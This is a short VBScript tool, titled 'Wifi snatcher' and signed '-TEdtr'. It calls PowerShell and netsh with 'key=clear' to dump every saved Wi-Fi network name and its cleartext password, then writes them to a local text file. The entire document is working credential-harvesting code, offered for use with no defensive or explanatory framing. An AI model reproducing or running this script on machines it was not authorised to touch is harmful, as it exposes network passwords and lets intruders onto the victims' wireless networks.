' Wifi snatcher tool
Option Explicit

Dim objShell,objFso,objExec,objFile
Dim wifiName, wifiPassword,command,strLine

' Objects 
Set objShell = CreateObject("WScript.Shell")
Set objFso = CreateObject("Scripting.FileSystemObject")
Set objFile =objFso.CreateTextFile("WifiDetails.txt",True)

' Execute Command 
command="powershell.exe -Command ""netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $_ -replace 'All User Profile     : ', ''; netsh wlan show profile name=''$(($_ -replace '.*: ', ''))'' key=clear }"""
Set objExec=objShell.Exec(command)

' Heading
objFile.Writeline "                WifiSnatcher                 "
objFile.Writeline "============================================="
objFile.Writeline "                                   -TEdtr    "

Do While Not objExec.StdOut.AtEndOfStream
    strLine = objExec.StdOut.ReadLine()
    
    ' Output Wi-Fi name and password 
       If InStr(strLine, "SSID name")>0  Then
       
        ' Extract Wi-Fi name
        wifiName = Trim(Split(strLine, ":")(1))
        objFile.Writeline "--------------------------------------------"
        objFile.Writeline "Wi-Fi Name: " & wifiName
       End If

        If InStr(strLine, "Key Content") > 0 Then
         
        ' Extract Wi-Fi password
         wifiPassword = Trim(Split(strLine, ":")(1)) 
         objFile.Writeline "Password: " & wifiPassword     
        End If
    
Loop

' Clean up
Set objShell = Nothing
Set objFso = Nothing
Set objExec = Nothing
Set objFile = Nothing


'-TEdtr
